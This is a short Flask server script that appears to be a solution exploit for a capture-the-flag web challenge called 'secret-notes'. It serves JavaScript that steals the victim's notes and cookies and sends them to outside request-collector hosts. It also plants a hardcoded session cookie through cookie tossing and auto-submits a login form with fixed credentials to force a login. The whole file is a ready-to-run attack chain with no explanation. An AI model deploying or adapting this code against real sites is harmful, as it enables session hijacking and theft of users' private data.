from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

@app.route('/')
def index():
    return '''<script>
window.name=`fetch('/notes').then(res=>res.text()).then(res=>fetch('https://aparequestsxss.requestcatcher.com/'+document.cookie,{method:'POST',body:JSON.stringify({a:res})}));`;
const leak = window.open("/leak",`document.cookie="session=eyJ1c2VybmFtZSI6IjQ3MDA1Y2NlNzNlOTQ2OTI5NGE0MGZkYTBiMzE4YmNmIn0.ZwNCdg.RB67uxygvl7N9SAciKhaD9haNAI;domain=secret-notes.1nf1n1ty.team;path=/profile";window.close()`);
</script>'''

@app.route('/leak')
def leak():
    return '''<script>function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}
function func(doc) {
  document.cookie;
  fetch("https://pfpcgiu.request.dreamhack.games/" + doc.cookie);
}
async function leak() {
  await sleep(10);
  
  const form = document.createElement("form");
  form.setAttribute("method", "POST");
  form.setAttribute("action", "https://secret-notes.1nf1n1ty.team/login");

  const usernameInput = document.createElement("input");
  usernameInput.setAttribute("type", "text");
  usernameInput.setAttribute("name", "username");
  usernameInput.required = true;
  usernameInput.value = "b8ac3decfb524cd49d4a03aeab99c136";
  form.appendChild(usernameInput);

  const passwordInput = document.createElement("input");
  passwordInput.setAttribute("type", "password");
  passwordInput.setAttribute("name", "password");
  passwordInput.value = "47005cce73e9469294a40fda0b318bcf";
  form.appendChild(passwordInput);

  const submitButton = document.createElement("button");
  submitButton.setAttribute("type", "submit");
  form.appendChild(submitButton);

  document.body.appendChild(form);
  form.submit();
}
leak();</script>'''


app.run(host="0.0.0.0", port=80)